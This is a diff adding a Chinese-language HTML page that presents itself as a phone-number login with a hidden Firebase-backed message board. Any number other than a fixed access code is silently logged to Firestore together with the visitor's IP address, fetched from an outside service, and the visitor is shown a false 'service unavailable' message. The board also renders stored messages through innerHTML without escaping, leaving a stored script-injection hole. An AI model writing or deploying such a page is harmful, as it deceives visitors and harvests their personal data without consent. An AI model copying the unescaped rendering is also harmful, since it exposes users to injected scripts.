@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>登录</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;color:#333}
+.container{max-width:380px;margin:40px auto;padding:0 20px}
+.card{background:#fff;border-radius:12px;padding:28px 24px;box-shadow:0 4px 20px rgba(0,0,0,.06);margin-bottom:30px}
+.logo{width:56px;height:56px;background:#1677ff;border-radius:50%;margin:0 auto 16px}
+.title{text-align:center;font-size:22px;font-weight:500;margin-bottom:20px}
+.input{width:100%;height:46px;padding:0 14px;border:1px solid #e5e6eb;border-radius:8px;font-size:16px;margin-bottom:12px;outline:none}
+.input:focus{border-color:#1677ff}
+.btn{width:100%;height:46px;background:#1677ff;color:#fff;border:none;border-radius:8px;font-size:16px}
+.tip{text-align:center;font-size:12px;color:#909399;margin-top:14px}
+.textarea{width:100%;padding:12px 14px;border:1px solid #e5e6eb;border-radius:8px;font-size:16px;resize:none;height:100px;margin-bottom:12px}
+#mainPage{display:none}
+.msg-card{background:#fff;padding:16px;border-radius:10px;margin-bottom:12px;box-shadow:0 2px 8px rgba(0,0,0,.05)}
+.msg-time{font-size:12px;color:#999;margin-top:4px}
+</style>
+</head>
+<body>
+<div class="container" id="loginPage">
+  <div class="card">
+    <div class="logo"></div>
+    <div class="title">账号登录</div>
+    <input type="text" id="input" class="input" placeholder="请输入手机号">
+    <button class="btn" onclick="check()">登录</button>
+    <div class="tip">未注册手机号将自动开通账号</div>
+  </div>
+</div>
+<div class="container" id="mainPage">
+  <div class="card">
+    <div class="title">留言板</div>
+    <textarea id="content" class="textarea" placeholder="写下你的留言..."></textarea>
+    <button class="btn" onclick="submit()">发布</button>
+    <div id="msgList" style="margin-top:20px"></div>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyAxz3wyIrapYRST4snbkm5jN_4hKrpJ2-s",
+  authDomain: "luket-board.firebaseapp.com",
+  projectId: "luket-board",
+  storageBucket: "luket-board.firebasestorage.app",
+  messagingSenderId: "190047125921",
+  appId: "1:190047125921:web:a7b0273bfe369622ba8be0"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+function ip(){return fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"unknown")}
+function log(t,p){ip().then(i=>{db.collection("failed_attempts").add({phone:p,ip:i,time:new Date().toISOString()})})}
+
+function check(){
+  var v=document.getElementById("input").value;
+  if(v==="995566"){
+    document.getElementById("loginPage").style.display="none";
+    document.getElementById("mainPage").style.display="block";
+    loadMsgs();
+  }else{
+    log(new Date().toLocaleString(),v);
+    alert("服务暂时不可用");
+  }
+}
+
+function submit(){
+  var c=document.getElementById("content").value.trim();
+  if(!c)return alert("请输入留言内容");
+  db.collection("messages").add({text:c,time:new Date().toISOString()}).then(()=>{
+    document.getElementById("content").value="";
+    loadMsgs();
+  });
+}
+
+function loadMsgs(){
+  db.collection("messages").orderBy("time","desc").limit(50).get().then(s=>{
+    let h="";
+    s.forEach(d=>{
+      let da=d.data();
+      let t=new Date(da.time).toLocaleString();
+      h+=`<div class="msg-card"><div class="msg-time">${t}</div><div>${da.text}</div></div>`;
+    });
+    document.getElementById("msgList").innerHTML=h;
+  });
+}
+</script>
+</body>
+</html>
